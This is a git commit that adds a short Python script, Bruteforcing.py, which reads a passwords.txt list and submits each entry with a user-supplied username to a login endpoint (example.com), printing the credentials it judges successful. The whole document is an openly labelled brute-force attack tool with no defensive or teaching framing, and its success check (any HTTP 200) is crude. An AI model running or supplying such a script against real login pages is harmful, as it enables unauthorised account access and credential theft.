a237b59ffc9a66d85c556891e2cfebc597f7979a
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2023-10-31 21:16:46 +0200

    Create Bruteforcing.py

---
+++ Bruteforcing.py
@@ -0,0 +1,26 @@
+import requests
+
+def brute_force_login(username):
+    password_file = open("passwords.txt", "r")
+    passwords = password_file.readlines()
+    password_file.close()
+
+    for password in passwords:
+        password = password.strip()
+        login_data = {
+            "username": username,
+            "password": password
+        }
+        response = requests.post("https://example.com/login", data=login_data)
+
+        if response.status_code == 200:
+            print("Login successful!")
+            print("Username:", username)
+            print("Password:", password)
+            break
+
+    print("Brute force attack completed.")
+
+# Usage example
+username = input("Enter the username: ")
+brute_force_login(username)
